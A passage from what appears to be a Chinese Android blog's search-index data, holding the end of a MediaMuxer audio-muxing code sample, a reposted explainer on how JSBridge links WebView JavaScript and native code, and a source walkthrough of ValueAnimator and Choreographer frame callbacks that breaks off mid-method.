Log.i(TAG, \"audio take data null !\"); continue; &#125; Log.i(TAG, \"audio take data, data left \" + audioQueue.size()); ByteBuffer buffer = ByteBuffer.allocate(frame.data.length); buffer.put(frame.data); MediaCodec.BufferInfo info = new MediaCodec.BufferInfo(); info.offset = 0; info.size = frame.data.length; info.presentationTimeUs = frame.presentationTimeUs; info.flags = 0; Log.i(TAG, \"audio info flags \" + info.flags + \" time \" + info.presentationTimeUs); if ((info.flags &amp; MediaCodec.BUFFER_FLAG_KEY_FRAME) != 0) &#123; Log.i(TAG, \"audio key frame !\"); &#125; mediaMuxer.writeSampleData(audioIndex, buffer, info); Log.i(TAG, \"audio write sample data finish\"); &#125; &#125; catch (InterruptedException | BrokenBarrierException e) &#123; // ignore Log.i(TAG, \"mux audio interrupted !\" + e.toString()); &#125; Log.i(TAG, \"mux audio finish, await\"); try &#123; stopCyclicBarrier.await(); &#125; catch (InterruptedException | BrokenBarrierException e) &#123; // ignore &#125; &#125; &#125;); audioWorkThread.start(); &#125; public void stopAudio() &#123; if (!audioWork) &#123; return; &#125; audioWork = false; &#125; public interface Callback &#123; void onMuxFinish(); &#125;&#125; 这里我们使用的是官方的MediaMuxer接口，官方文档如下：https://developer.android.com/reference/android/media/MediaMuxer 这里我们通过两个BlockingQueue阻塞队列来持续提供数据，分别使用两个线程来添加音频帧与视频帧数据由于音频与视频编码速度存在差异（实践下经常是音频编码比视频快很多），这里我们使用CyclicBarrier来控制混合流程的开始与结束","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"音视频","slug":"音视频","permalink":"https://superxlcr.github.io/tags/音视频/"}]},{"title":"JSBridge的原理","slug":"JSBridge的原理","date":"2019-11-21T07:44:37.000Z","updated":"2020-05-11T07:23:44.703Z","comments":true,"path":"2019/11/21/JSBridge的原理/","link":"","permalink":"https://superxlcr.github.io/2019/11/21/JSBridge的原理/","excerpt":"","text":"本文转载自：https://juejin.im/post/5abca877f265da238155b6bc 关于 JSBridge，绝大多数同学最早遇到的是微信的 WeiXinJSBridge（现在被封装成 JSSDK），各种 Web 页面可以通过 Bridge 调用微信提供的一些原生功能，为用户提供相关的功能。其实，JSBridge 很早就出现在软件开发中，在一些桌面软件中很早就运用了这样的形式，多用在通知、产品详情、广告等模块中，然后这些模块中，使用的是 Web UI，而相关按钮点击后，调用的是 Native 功能。现在移动端盛行，不管是 Hybrid 应用，还是 React-Native 都离不开 JSBridge，当然也包括在国内举足轻重的微信小程序。那么，JSBridge 到底是什么？它的出现是为了什么？它究竟是怎么实现的？在这篇文章中，会在移动混合开发的范畴内，将给大家带来 JSBridge 的深入剖析。 前言有些童鞋听到 JSBridge 这个名词，就是觉得非常高上大，有了它 Web 和 Native 可以进行交互，就像『进化药水』，让 Web 摇身一变，成为移动战场的『上将一名』。其实并非如此，JSBridge 其实真是一个很简单的东西，更多的是一种形式、一种思想。 JSBridge 的起源为什么是 JSBridge ？而不是 PythonBridge 或是 RubyBridge ？当然不是因为 JavaScript 语言高人一等（虽然斯坦福大学已经把算法导论的语言从 Java 改成 JavaScript，小得意一下，嘻嘻），主要的原因还是因为 JavaScript 主要载体 Web 是当前世界上的最易编写 、 最易维护 、最易部署的 UI 构建方式。工程师可以用很简单的 HTML 标签和 CSS 样式快速的构建出一个页面，并且在服务端部署后，用户不需要主动更新，就能看到最新的 UI 展现。因此，开发维护成本和更新成本较低的 Web 技术成为混合开发中几乎不二的选择，而作为 Web 技术逻辑核心的 JavaScript 也理所应当肩负起与其他技术『桥接』的职责，并且作为移动不可缺少的一部分，任何一个移动操作系统中都包含可运行 JavaScript 的容器，例如 WebView 和 JSCore。所以，运行 JavaScript 不用像运行其他语言时，要额外添加运行环境。因此，基于上面种种原因，JSBridge 应运而生。PhoneGap（Codova 的前身）作为 Hybrid 鼻祖框架，应该是最先被开发者广泛认知的 JSBridge 的应用场景；而对于 JSBridge 的应用在国内真正兴盛起来，则是因为杀手级应用微信的出现，主要用途是在网页中通过 JSBridge 设置分享内容。移动端混合开发中的 JSBridge，主要被应用在两种形式的技术方案上： 基于 Web 的 Hybrid 解决方案：例如微信浏览器、各公司的 Hybrid 方案 非基于 Web UI 但业务逻辑基于 JavaScript 的解决方案：例如 React-Native 【注】：微信小程序基于 Web UI，但是为了追求运行效率，对 UI 展现逻辑和业务逻辑的 JavaScript 进行了隔离。因此小程序的技术方案介于上面描述的两种方式之间。 JSBridge 的用途JSBridge 简单来讲，主要是 给JavaScript 提供调用 Native 功能的接口，让混合开发中的『前端部分』可以方便地使用地址位置、摄像头甚至支付等 Native 功能。既然是『简单来讲』，那么 JSBridge 的用途肯定不只『调用 Native 功能』这么简单宽泛。实际上，JSBridge 就像其名称中的『Bridge』的意义一样，是 Native 和非 Native 之间的桥梁，它的核心是构建 Native 和非 Native 间消息通信的通道，而且是 双向通信的通道。 所谓 双向通信的通道: JS 向 Native 发送消息 : 调用相关功能、通知 Native 当前 JS 的相关状态等。 Native 向 JS 发送消息 : 回溯调用结果、消息推送、通知 JS 当前 Native 的状态等。 这里有些同学有疑问了：消息都是单向的，那么调用 Native 功能时 Callback 怎么实现的？对于这个问题，在下一节里会给出解释。 JSBridge 的实现原理JavaScript 是运行在一个单独的 JS Context 中（例如，WebView 的 Webkit 引擎、JSCore）。由于这些 Context 与原生运行环境的天然隔离，我们可以将这种情况与 RPC（Remote Procedure Call，远程过程调用）通信进行类比，将 Native 与 JavaScript 的每次互相调用看做一次 RPC 调用。在 JSBridge 的设计中，可以把前端看做 RPC 的客户端，把 Native 端看做 RPC 的服务器端，从而 JSBridge 要实现的主要逻辑就出现了：通信调用（Native 与 JS 通信）和句柄解析调用。（如果你是个前端，而且并不熟悉 RPC 的话，你也可以把这个流程类比成 JSONP 的流程）通过以上的分析，可以清楚地知晓 JSBridge 主要的功能和职责，接下来就以Hybrid 方案为案例从这几点来剖析 JSBridge 的实现原理。 JSBridge 的通信原理Hybrid 方案是基于 WebView 的，JavaScript 执行在 WebView 的 Webkit 引擎中。因此，Hybrid 方案中 JSBridge 的通信原理会具有一些 Web 特性。 JavaScript 调用 NativeJavaScript 调用 Native 的方式，主要有两种：注入 API 和 拦截 URL SCHEME。 注入API注入 API 方式的主要原理是，通过 WebView 提供的接口，向 JavaScript 的 Context（window）中注入对象或者方法，让 JavaScript 调用时，直接执行相应的 Native 代码逻辑，达到 JavaScript 调用 Native 的目的。 对于 Android 可以采用下面的方式： 1234567891011121314151617181920212223242526272829public class JavaScriptInterfaceDemoActivityextendsActivity &#123; private WebView Wv; @Override public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); Wv = (WebView)findViewById(R.id.webView); final JavaScriptInterface myJavaScriptInterface = new JavaScriptInterface(this); Wv.getSettings().setJavaScriptEnabled(true); Wv.addJavascriptInterface(myJavaScriptInterface, \"nativeBridge\"); // TODO 显示 WebView &#125; public class JavaScriptInterface &#123; Context mContext; JavaScriptInterface(Context c) &#123; mContext = c; &#125; public void postMessage(String webMessage) &#123; // Native 逻辑 &#125; &#125;&#125; 前端调用方式： 1window.nativeBridge.postMessage(message); 在 4.2 之前，Android 注入 JavaScript 对象的接口是 addJavascriptInterface，但是这个接口有漏洞，可以被不法分子利用，危害用户的安全，因此在 4.2 中引入新的接口 @JavascriptInterface（上面代码中使用的）来替代这个接口，解决安全问题。所以 Android 注入对对象的方式是有兼容性问题的。（4.2 之前很多方案都采用拦截 prompt 的方式来实现，因为篇幅有限，这里就不展开了。） 拦截 URL SCHEME先解释一下 URL SCHEME：URL SCHEME是一种类似于url的链接，是为了方便app直接互相调用设计的，形式和普通的 url 近似，主要区别是 protocol 和 host 一般是自定义的，例如: qunarhy://hy/url?url=ymfe.tech，protocol 是 qunarhy，host 则是 hy。拦截 URL SCHEME 的主要流程是：Web 端通过某种方式（例如 iframe.src）发送 URL Scheme 请求，之后 Native 拦截到请求并根据 URL SCHEME（包括所带的参数）进行相关操作。在时间过程中，这种方式有一定的 缺陷： 使用 iframe.src 发送 URL SCHEME 会有 url 长度的隐患。 创建请求，需要一定的耗时，比注入 API 的方式调用同样的功能，耗时会较长。 但是之前为什么很多方案使用这种方式呢？因为它 支持 iOS6。而现在的大环境下，iOS6 占比很小，基本上可以忽略，所以并不推荐为了 iOS6 使用这种 并不优雅 的方式。【注】：有些方案为了规避 url 长度隐患的缺陷，在 iOS 上采用了使用 Ajax 发送同域请求的方式，并将参数放到 head 或 body 里。这样，虽然规避了 url 长度的隐患，但是 WKWebView 并不支持这样的方式。【注2】：为什么选择 iframe.src 不选择 locaiton.href ？因为如果通过 location.href 连续调用 Native，很容易丢失一些调用。 Native 调用 JavaScript相比于 JavaScript 调用 Native， Native 调用 JavaScript 较为简单，毕竟不管是 iOS 的 UIWebView 还是 WKWebView，还是 Android 的 WebView 组件，都以子组件的形式存在于 View/Activity 中，直接调用相应的 API 即可。Native 调用 JavaScript，其实就是执行拼接 JavaScript 字符串，从外部调用 JavaScript 中的方法，因此 JavaScript 的方法必须在全局的 window 上。（闭包里的方法，JavaScript 自己都调用不了，更不用想让 Native 去调用了）对于 Android，在 Kitkat（4.4）之前并没有提供 iOS 类似的调用方式，只能用 loadUrl 一段 JavaScript 代码，来实现： 1webView.loadUrl(\"javascript:\" + javaScriptString); 而 Kitkat 之后的版本，也可以用 evaluateJavascript 方法实现： 123456webView.evaluateJavascript(javaScriptString, new ValueCallback&lt;String&gt;() &#123; @Override public void onReceiveValue(String value)&#123; &#125;&#125;); 【注】：使用 loadUrl 的方式，并不能获取 JavaScript 执行后的结果。 通信原理小总结通信原理是 JSBridge 实现的核心，实现方式可以各种各样，但是万变不离其宗。这里，笔者推荐的实现方式如下： JavaScript 调用 Native 推荐使用 注入 API 的方式（iOS6 忽略，Android 4.2以下使用 WebViewClient 的 onJsPrompt 方式）。 Native 调用 JavaScript 则直接执行拼接好的 JavaScript 代码即可。 对于其他方式，诸如 React Native、微信小程序 的通信方式都与上描述的近似，并根据实际情况进行优化。以 React Native 的 iOS 端举例：JavaScript 运行在 JSCore 中，实际上可以与上面的方式一样，利用注入 API 来实现 JavaScript 调用 Native 功能。不过 React Native 并没有设计成 JavaScript 直接调用 Object-C，而是 为了与 Native 开发里事件响应机制一致，设计成 需要在 Object-C 去调 JavaScript 时才通过返回值触发调用。原理基本一样，只是实现方式不同。当然不仅仅 iOS 和 Android，其他手机操作系统也用相应的 API，例如 WMP（Win 10）下可以用 window.external.notify 和 WebView.InvokeScript/InvokeScriptAsync 进行双向通信。其他系统也类似。 JSBridge 接口实现从上面的剖析中，可以得知，JSBridge 的接口主要功能有两个：调用 Native（给 Native 发消息） 和 被 Native 调用（接收 Native 消息）。因此，JSBridge 可以设计如下： 12345678910window.JSBridge = &#123; // 调用 Native invoke: function(msg) &#123; // 判断环境，获取不同的 nativeBridge nativeBridge.postMessage(msg); &#125;, receiveMessage: function(msg) &#123; // 处理 msg &#125;&#125;; 在上面的文章中，提到过 RPC 中有一个非常重要的环节是 句柄解析调用 ，这点在 JSBridge 中体现为 句柄与功能对应关系。同时，我们将句柄抽象为 桥名（BridgeName），最终演化为 一个 BridgeName 对应一个 Native 功能或者一类 Native 消息。 基于此点，JSBridge 的实现可以优化为如下： 123456789101112131415window.JSBridge = &#123; // 调用 Native invoke: function(bridgeName, data) &#123; // 判断环境，获取不同的 nativeBridge nativeBridge.postMessage(&#123; bridgeName: bridgeName, data: data || &#123;&#125; &#125;); &#125;, receiveMessage: function(msg) &#123; var bridgeName = msg.bridgeName, data = msg.data || &#123;&#125;; // 具体逻辑 &#125;&#125;; JSBridge 大概的雏形出现了。现在终于可以着手解决这个问题了：消息都是单向的，那么调用 Native 功能时 Callback 怎么实现的？对于 JSBridge 的 Callback ，其实就是 RPC 框架的回调机制。当然也可以用更简单的 JSONP 机制解释： 当发送 JSONP 请求时，url 参数里会有 callback 参数，其值是 当前页面唯一 的，而同时以此参数值为 key 将回调函数存到 window 上，随后，服务器返回 script 中，也会以此参数值作为句柄，调用相应的回调函数。 由此可见，callback 参数这个 唯一标识 是这个回调逻辑的关键。这样，我们可以参照这个逻辑来实现 JSBridge：用一个自增的唯一 id，来标识并存储回调函数，并把此 id 以参数形式传递给 Native，而 Native 也以此 id 作为回溯的标识。这样，即可实现 Callback 回调逻辑。 1234567891011121314151617181920212223242526272829303132(function () &#123; var id = 0, callbacks = &#123;&#125;; window.JSBridge = &#123; // 调用 Native invoke: function(bridgeName, callback, data) &#123; // 判断环境，获取不同的 nativeBridge var thisId = id ++; // 获取唯一 id callbacks[thisId] = callback; // 存储 Callback nativeBridge.postMessage(&#123; bridgeName: bridgeName, data: data || &#123;&#125;, callbackId: thisId // 传到 Native 端 &#125;); &#125;, receiveMessage: function(msg) &#123; var bridgeName = msg.bridgeName, data = msg.data || &#123;&#125;, callbackId = msg.callbackId; // Native 将 callbackId 原封不动传回 // 具体逻辑 // bridgeName 和 callbackId 不会同时存在 if (callbackId) &#123; if (callbacks[callbackId]) &#123; // 找到相应句柄 callbacks[callbackId](msg.data); // 执行调用 &#125; &#125; elseif (bridgeName) &#123; &#125; &#125; &#125;;&#125;)(); 最后用同样的方式加上 Native 调用的回调逻辑，同时对代码进行一些优化，就大概实现了一个功能比较完整的 JSBridge。其代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455(function () &#123; var id = 0, callbacks = &#123;&#125;, registerFuncs = &#123;&#125;; window.JSBridge = &#123; // 调用 Native invoke: function(bridgeName, callback, data) &#123; // 判断环境，获取不同的 nativeBridge var thisId = id ++; // 获取唯一 id callbacks[thisId] = callback; // 存储 Callback nativeBridge.postMessage(&#123; bridgeName: bridgeName, data: data || &#123;&#125;, callbackId: thisId // 传到 Native 端 &#125;); &#125;, receiveMessage: function(msg) &#123; var bridgeName = msg.bridgeName, data = msg.data || &#123;&#125;, callbackId = msg.callbackId, // Native 将 callbackId 原封不动传回 responstId = msg.responstId; // 具体逻辑 // bridgeName 和 callbackId 不会同时存在 if (callbackId) &#123; if (callbacks[callbackId]) &#123; // 找到相应句柄 callbacks[callbackId](msg.data); // 执行调用 &#125; &#125; elseif (bridgeName) &#123; if (registerFuncs[bridgeName]) &#123; // 通过 bridgeName 找到句柄 var ret = &#123;&#125;, flag = false; registerFuncs[bridgeName].forEach(function(callback) =&gt; &#123; callback(data, function(r) &#123; flag = true; ret = Object.assign(ret, r); &#125;); &#125;); if (flag) &#123; nativeBridge.postMessage(&#123; // 回调 Native responstId: responstId, ret: ret &#125;); &#125; &#125; &#125; &#125;, register: function(bridgeName, callback) &#123; if (!registerFuncs[bridgeName]) &#123; registerFuncs[bridgeName] = []; &#125; registerFuncs[bridgeName].push(callback); // 存储回调 &#125; &#125;;&#125;)(); 当然，这段代码片段只是一个示例，主要用于剖析 JSBridge 的原理和流程，里面存在诸多省略和不完善的代码逻辑，读者们可以自行完善。 【注】：这一节主要讲的是，JavaScript 端的 JSBridge 的实现，对于 Native 端涉及的并不多。在 Native 端配合实现 JSBridge 的 JavaScript 调用 Native 逻辑也很简单，主要的代码逻辑是：接收到 JavaScript 消息 =&gt; 解析参数，拿到 bridgeName、data 和 callbackId =&gt; 根据 bridgeName 找到功能方法，以 data 为参数执行 =&gt; 执行返回值和 callbackId 一起回传前端。 Native 调用 JavaScript 也同样简单，直接自动生成一个唯一的 ResponseId，并存储句柄，然后和 data 一起发送给前端即可。 JSBridge 如何引用对于 JSBridge 的引用，常用有两种方式，各有利弊。 由 Native 端进行注入注入方式和 Native 调用 JavaScript 类似，直接执行桥的全部代码。 它的优点在于：桥的版本很容易与 Native 保持一致，Native 端不用对不同版本的 JSBridge 进行兼容；与此同时，它的缺点是：注入时机不确定，需要实现注入失败后重试的机制，保证注入的成功率，同时 JavaScript 端在调用接口时，需要优先判断 JSBridge 是否已经注入成功。 由 JavaScript 端引用直接与 JavaScript 一起执行。 与由 Native 端注入正好相反，它的优点在于：JavaScript 端可以确定 JSBridge 的存在，直接调用即可；缺点是：如果桥的实现方式有更改，JSBridge 需要兼容多版本的 Native Bridge 或者 Native Bridge 兼容多版本的 JSBridge。 总结这篇文章主要剖析的 JSBridge 的实现及应用，包括 JavaScript 与 Native 间的通信原理，JSBridge 的 JavaScript 端实现 以及 引用方式，并给出了一些示例代码，希望对读者有一定的帮助。","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"程序设计","slug":"程序设计","permalink":"https://superxlcr.github.io/tags/程序设计/"}]},{"title":"属性动画执行流程探究","slug":"属性动画执行流程探究","date":"2019-11-18T03:04:55.000Z","updated":"2020-05-11T07:23:44.848Z","comments":true,"path":"2019/11/18/属性动画执行流程探究/","link":"","permalink":"https://superxlcr.github.io/2019/11/18/属性动画执行流程探究/","excerpt":"","text":"博主最近看了下属性动画执行流程相关的源码，在此写篇博客记录一下 ValueAnimator源码我们先来看下ValueAnimator#start方法：这里的源码版本是api28 123456789101112131415161718192021222324252627@Overridepublic void start() &#123; start(false);&#125;private void start(boolean playBackwards) &#123; if (Looper.myLooper() == null) &#123; throw new AndroidRuntimeException(\"Animators may only be run on Looper threads\"); &#125; ... addAnimationCallback(0); if (mStartDelay == 0 || mSeekFraction &gt;= 0 || mReversing) &#123; // If there's no start delay, init the animation and notify start listeners right away // to be consistent with the previous behavior. Otherwise, postpone this until the first // frame after the start delay. startAnimation(); if (mSeekFraction == -1) &#123; // No seek, start at play time 0. Note that the reason we are not using fraction 0 // is because for animations with 0 duration, we want to be consistent with pre-N // behavior: skip to the final value immediately. setCurrentPlayTime(0); &#125; else &#123; setCurrentFraction(mSeekFraction); &#125; &#125;&#125; 从上面的方法中，我们可以得到以下几个信息： 我们必须在一个拥有Looper的线程中启动属性动画 通过ValueAnimator#addAnimationCallback设置动画每帧的回调 接下来我们来看看ValueAnimator#addAnimationCallback： 12345678910111213141516171819private void addAnimationCallback(long delay) &#123; if (!mSelfPulse) &#123; return; &#125; getAnimationHandler().addAnimationFrameCallback(this, delay);&#125;public AnimationHandler getAnimationHandler() &#123; return AnimationHandler.getInstance();&#125;public final static ThreadLocal&lt;AnimationHandler&gt; sAnimatorHandler = new ThreadLocal&lt;&gt;();public static AnimationHandler getInstance() &#123; if (sAnimatorHandler.get() == null) &#123; sAnimatorHandler.set(new AnimationHandler()); &#125; return sAnimatorHandler.get();&#125; ValueAnimator#addAnimationCallback方法调用了AnimationHandler#addAnimationFrameCallback方法，把自己注册为动画帧的回调通过AnimationHandler#getInstance方法以及ThreadLocal变量类型我们可以看出，AnimationHandler应该是每个线程独有一份的 接下来我们来看看AnimationHandler#addAnimationFrameCallback： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051private final ArrayList&lt;AnimationFrameCallback&gt; mAnimationCallbacks = new ArrayList&lt;&gt;();public void addAnimationFrameCallback(final AnimationFrameCallback callback, long delay) &#123; if (mAnimationCallbacks.size() == 0) &#123; getProvider().postFrameCallback(mFrameCallback); &#125; if (!mAnimationCallbacks.contains(callback)) &#123; mAnimationCallbacks.add(callback); &#125; if (delay &gt; 0) &#123; mDelayedCallbackStartTime.put(callback, (SystemClock.uptimeMillis() + delay)); &#125;&#125;private AnimationFrameCallbackProvider getProvider() &#123; if (mProvider == null) &#123; mProvider = new MyFrameCallbackProvider(); &#125; return mProvider;&#125;private class MyFrameCallbackProvider implements AnimationFrameCallbackProvider &#123; final Choreographer mChoreographer = Choreographer.getInstance(); @Override public void postFrameCallback(Choreographer.FrameCallback callback) &#123; mChoreographer.postFrameCallback(callback); &#125; @Override public void postCommitCallback(Runnable runnable) &#123; mChoreographer.postCallback(Choreographer.CALLBACK_COMMIT, runnable, null); &#125; @Override public long getFrameTime() &#123; return mChoreographer.getFrameTime(); &#125; @Override public long getFrameDelay() &#123; return Choreographer.getFrameDelay(); &#125; @Override public void setFrameDelay(long delay) &#123; Choreographer.setFrameDelay(delay); &#125;&#125; 在该方法中我们可以看到，不考虑延迟的情况下，回调会被加入到mAnimationCallbacks列表中如果是首次在AnimationHandler注册动画帧的回调，还会调用MyFrameCallbackProvider#postFrameCallback方法，即调用Choreographer#postFrameCallback方法 Choreographer源码在跟踪接下来的代码之前，我们先来看看什么是Choreographer，他的中文意思是编舞者，官方的doc介绍如下： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556/** * Coordinates the timing of animations, input and drawing. * &lt;p&gt; * The choreographer receives timing pulses (such as vertical synchronization) * from the display subsystem then schedules work to occur as part of rendering * the next display frame. * &lt;/p&gt;&lt;p&gt; * Applications typically interact with the choreographer indirectly using * higher level abstractions in the animation framework or the view hierarchy. * Here are some examples of things you can do using the higher-level APIs. * &lt;/p&gt; * &lt;ul&gt; * &lt;li&gt;To post an animation to be processed on a regular time basis synchronized with * display frame rendering, use &#123;@link android.animation.ValueAnimator#start&#125;.&lt;/li&gt; * &lt;li&gt;To post a &#123;@link Runnable&#125; to be invoked once at the beginning of the next display * frame, use &#123;@link View#postOnAnimation&#125;.&lt;/li&gt; * &lt;li&gt;To post a &#123;@link Runnable&#125; to be invoked once at the beginning of the next display * frame after a delay, use &#123;@link View#postOnAnimationDelayed&#125;.&lt;/li&gt; * &lt;li&gt;To post a call to &#123;@link View#invalidate()&#125; to occur once at the beginning of the * next display frame, use &#123;@link View#postInvalidateOnAnimation()&#125; or * &#123;@link View#postInvalidateOnAnimation(int, int, int, int)&#125;.&lt;/li&gt; * &lt;li&gt;To ensure that the contents of a &#123;@link View&#125; scroll smoothly and are drawn in * sync with display frame rendering, do nothing. This already happens automatically. * &#123;@link View#onDraw&#125; will be called at the appropriate time.&lt;/li&gt; * &lt;/ul&gt; * &lt;p&gt; * However, there are a few cases where you might want to use the functions of the * choreographer directly in your application. Here are some examples. * &lt;/p&gt; * &lt;ul&gt; * &lt;li&gt;If your application does its rendering in a different thread, possibly using GL, * or does not use the animation framework or view hierarchy at all * and you want to ensure that it is appropriately synchronized with the display, then use * &#123;@link Choreographer#postFrameCallback&#125;.&lt;/li&gt; * &lt;li&gt;... and that's about it.&lt;/li&gt; * &lt;/ul&gt; * &lt;p&gt; * Each &#123;@link Looper&#125; thread has its own choreographer. Other threads can * post callbacks to run on the choreographer but they will run on the &#123;@link Looper&#125; * to which the choreographer belongs. * &lt;/p&gt; */public final class Choreographer &#123;// Thread local storage for the SF choreographer.private static final ThreadLocal&lt;Choreographer&gt; sSfThreadInstance = new ThreadLocal&lt;Choreographer&gt;() &#123; @Override protected Choreographer initialValue() &#123; Looper looper = Looper.myLooper(); if (looper == null) &#123; throw new IllegalStateException(\"The current thread must have a looper!\"); &#125; return new Choreographer(looper, VSYNC_SOURCE_SURFACE_FLINGER); &#125; &#125;; 从上面的doc我们可以得到以下信息： Choreographer是用来计算动画、触摸事件输入以及绘制的时间戳的，负责回调每帧的刷新 每个线程都有自己的Choreographer，Choreographer会在属于该线程的Looper上工作，我们必须在一个有Looper的线程上才能创建Choreographer 接下来我们来看看Choreographer#postFrameCallback方法： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354public void postFrameCallback(FrameCallback callback) &#123; postFrameCallbackDelayed(callback, 0);&#125;public void postFrameCallbackDelayed(FrameCallback callback, long delayMillis) &#123; if (callback == null) &#123; throw new IllegalArgumentException(\"callback must not be null\"); &#125; postCallbackDelayedInternal(CALLBACK_ANIMATION, callback, FRAME_CALLBACK_TOKEN, delayMillis);&#125;private void postCallbackDelayedInternal(int callbackType, Object action, Object token, long delayMillis) &#123; ... synchronized (mLock) &#123; final long now = SystemClock.uptimeMillis(); final long dueTime = now + delayMillis; mCallbackQueues[callbackType].addCallbackLocked(dueTime, action, token); if (dueTime &lt;= now) &#123; scheduleFrameLocked(now); &#125; else &#123; Message msg = mHandler.obtainMessage(MSG_DO_SCHEDULE_CALLBACK, action); msg.arg1 = callbackType; msg.setAsynchronous(true); mHandler.sendMessageAtTime(msg, dueTime); &#125; &#125;&#125;public void addCallbackLocked(long dueTime, Object action, Object token) &#123; CallbackRecord callback = obtainCallbackLocked(dueTime, action, token); CallbackRecord entry = mHead; if (entry == null) &#123; mHead = callback; return; &#125; if (dueTime &lt; entry.dueTime) &#123; callback.next = entry; mHead = callback; return; &#125; while (entry.next != null) &#123; if (dueTime &lt; entry.next.dueTime) &#123; callback.next = entry.next; break; &#125; entry = entry.next; &#125; entry.next = callback;&#125; 可以看到，在调用了postFrameCallback方法后，我们的回调被加入到了mCallbackQueues列表中值得注意的是mCallbackQueues列表是个链表结构，内部的item按照dueTime时间从小到大排列然后如果在没有延时的情况下，则调用了scheduleFrameLocked方法准备回调帧信号如果在有延时的情况下，则发送了一条异步handler消息，延时后再回调帧信号这里我们继续不考虑延时的状况，看一下scheduleFrameLocked方法： 1234567891011121314151617181920212223242526272829303132private void scheduleFrameLocked(long now) &#123; if (!mFrameScheduled) &#123; mFrameScheduled = true; if (USE_VSYNC) &#123; ... // If running on the Looper thread, then schedule the vsync immediately, // otherwise post a message to schedule the vsync from the UI thread // as soon as possible. if (isRunningOnLooperThreadLocked()) &#123; scheduleVsyncLocked(); &#125; else &#123; Message msg = mHandler.obtainMessage(MSG_DO_SCHEDULE_VSYNC); msg.setAsynchronous(true); mHandler.sendMessageAtFrontOfQueue(msg); &#125; &#125; else &#123; final long nextFrameTime = Math.max( mLastFrameTimeNanos / TimeUtils.NANOS_PER_MS + sFrameDelay, now); if (DEBUG_FRAMES) &#123; Log.d(TAG, \"Scheduling next frame in \" + (nextFrameTime - now) + \" ms.\"); &#125; Message msg = mHandler.obtainMessage(MSG_DO_FRAME); msg.setAsynchronous(true); mHandler.sendMessageAtTime(msg, nextFrameTime); &#125; &#125;&#125;private void scheduleVsyncLocked() &#123; mDisplayEventReceiver.scheduleVsync();&#125; 通过boolean值的判断我们可以看出，回调帧信号方法每次只会执行一次当我们使用了VSYNC（垂直同步信号）的情况下，最终会调用mDisplayEventReceiver变量的scheduleVsync方法其他情况则会使用Handler发送异步消息来执行帧回调 接下来我们来看看scheduleVsync方法： 1234567891011121314151617181920212223242526272829303132333435363738394041 private final FrameDisplayEventReceiver mDisplayEventReceiver; public void scheduleVsync() &#123; if (mReceiverPtr == 0) &#123; Log.w(TAG, \"Attempted to schedule a vertical sync pulse but the display event \" + \"receiver has already been disposed.\"); &#125; else &#123; nativeScheduleVsync(mReceiverPtr); &#125; &#125; @FastNative private static native void nativeScheduleVsync(long receiverPtr); // Called from native code. @SuppressWarnings(\"unused\") private void dispatchVsync(long timestampNanos, int builtInDisplayId, int frame) &#123; onVsync(timestampNanos, builtInDisplayId, frame); &#125; private final class FrameDisplayEventReceiver extends DisplayEventReceiver implements Runnable &#123; ... @Override public void onVsync(long timestampNanos, int builtInDisplayId, int frame) &#123; ... mTimestampNanos = timestampNanos; mFrame = frame; Message msg = Message.obtain(mHandler, this); msg.setAsynchronous(true); mHandler.sendMessageAtTime(msg, timestampNanos / TimeUtils.NANOS_PER_MS); &#125;@Override public void run() &#123; mHavePendingVsync = false; doFrame(mTimestampNanos, mFrame); &#125; &#125; 可以看到scheduleVsync方法调用了native方法nativeScheduleVsync，这里我们就不再继续追踪了根据代码的注释不难推断，当VSYNC同步回来时，会调用dispatchVsync方法而dispatchVsync方法则会调用onVsync方法，然后通过发送异步消息来处理帧信号由于Message里面设置的回调Runnable是FrameDisplayEventReceiver自己，因此最终消息会回调到run方法中，会调用doFrame方法 下面我们来看看Choreographer的doFrame方法： 12345678910111213141516171819202122232425262728293031void doFrame(long frameTimeNanos, int frame) &#123; final long startNanos; synchronized (mLock) &#123; ... mFrameInfo.setVsync(intendedFrameTimeNanos, frameTimeNanos); mFrameScheduled = false; mLastFrameTimeNanos = frameTimeNanos; &#125; try &#123; Trace.traceBegin(Trace.TRACE_TAG_VIEW, \"Choreographer#doFrame\"); AnimationUtils.lockAnimationClock(frameTimeNanos / TimeUtils.NANOS_PER_MS); mFrameInfo.markInputHandlingStart(); doCallbacks(Choreographer.CALLBACK_INPUT, frameTimeNanos); mFrameInfo.markAnimationsStart(); doCallbacks(Choreographer.CALLBACK_ANIMATION, frameTimeNanos); mFrameInfo.markPerformTraversalsStart(); doCallbacks(Choreographer.CALLBACK_TRAVERSAL, frameTimeNanos); doCallbacks(Choreographer.CALLBACK_COMMIT, frameTimeNanos); &#125; finally &#123; AnimationUtils.unlockAnimationClock(); Trace.traceEnd(Trace.TRACE_TAG_VIEW); &#125; ...&#125; doFrame方法比较复杂，我们这里省略一些卡顿检测与丢帧的处理在开始与最后分别调用了AnimationUtils的lockAnimationClock与unlockAnimationClock方法，用于锁定当前的动画时间，这里我们也不深究，直接看一下如何在帧回调中处理动画、触摸事件输入以及绘制无一例外，在处理动画、触摸事件输入以及绘制之前，都调用了FrameInfo#markXXXStart方法，这里我们看下： 1234567891011public void markInputHandlingStart() &#123; mFrameInfo[HANDLE_INPUT_START] = System.nanoTime();&#125;public void markAnimationsStart() &#123; mFrameInfo[ANIMATION_START] = System.nanoTime();&#125;public void markPerformTraversalsStart() &#123; mFrameInfo[PERFORM_TRAVERSALS_START] = System.nanoTime();&#125; 只是存储了当前的时间戳，我们接下来看看doCallbacks方法怎么处理回调： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273void doCallbacks(int callbackType, long frameTimeNanos) &#123; CallbackRecord callbacks; synchronized (mLock) &#123; // We use \"now\" to determine when callbacks become due because it's possible // for earlier processing phases in a frame to post callbacks that should run // in a following phase, such as an input event that causes an animation to start. final long now = System.nanoTime(); callbacks = mCallbackQueues[callbackType].extractDueCallbacksLocked( now / TimeUtils.NANOS_PER_MS); if (callbacks == null) &#123; 